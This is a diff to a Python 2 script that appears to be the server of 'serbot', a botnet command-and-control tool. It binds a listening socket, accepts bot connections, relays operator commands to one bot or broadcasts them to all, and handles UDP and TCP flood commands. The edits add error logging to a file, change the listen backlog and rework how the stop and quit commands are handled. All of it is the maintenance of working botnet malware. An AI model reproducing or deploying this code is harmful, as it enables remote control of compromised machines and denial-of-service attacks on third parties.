@@ -1,7 +1,6 @@
 #!/usr/bin/env python2
-#v3
 
-import os, sys, time
+import os, sys, time, datetime
 from socket import *
 
 if (len(sys.argv) == 4):
@@ -25,21 +24,25 @@ Blog: http://dotcppfile.worpdress.com"
 s=socket(AF_INET, SOCK_STREAM)
 s.settimeout(5)
 s.bind(("0.0.0.0",port)) 
-s.listen(100)
+s.listen(5)
 
 allConnections = []
-allAddresses = []
+allAddresses = []	
 
-def updateLogs():
-	
+def updateLogs(newlog):
+	time = datetime.datetime.now()	
+	newlog = "[%s] %s\n" % (time, newlog)
+	f = open("serbot-logs.txt", "a")	
+	f.write(newlog)
+	f.close()
 
 def quitClients():
 	for item in allConnections:
 		try:
 			item.send("exit")
 			item.close()
-		except:
-			pass
+		except Exception as error:
+			updateLogs(error)
 
 	del allConnections[:]
 	del allAddresses[:]	
@@ -117,7 +120,7 @@ def main():
 
 							try:
 								data=q.recv(10240)
-								if ((data != "stop") and ("cd " not in data) and ("udpflood " not in data) and ("tcpflood " not in data) and (data != "quit")):
+								if ((data != "stop") and ("cd " not in data) and ("udpflood " not in data) and ("tcpflood " not in data)):
 									try:
 										allConnections[chosenone].send(data)
 										msg=allConnections[chosenone].recv(10240)
@@ -143,11 +146,8 @@ def main():
 									except:
 										q.send("[ERROR] Client closed the connection\n")
 										break
-								elif (data == "stop"):
-									break
 								
-								elif (data == "quit"):
-									breakit = True
+								elif (data == "stop"):
 									break
 							except:
 								quitClients()
@@ -160,8 +160,8 @@ def main():
 				for item in allConnections:
 					try:
 						item.send(command)
-					except:
-						pass
+					except Exception as error:
+						updateLogs(error)
 			elif(command == "quit"):
 				quitClients()
 				break
@@ -178,7 +178,9 @@ while 1:
 
 			del allConnections[:]
 			del allAddresses[:]
-		except:
-			pass
+		except Exception as error:
+			updateLogs(error)
+	except Exception as error:
+		updateLogs(error)
+	
 	time.sleep(5)
-		
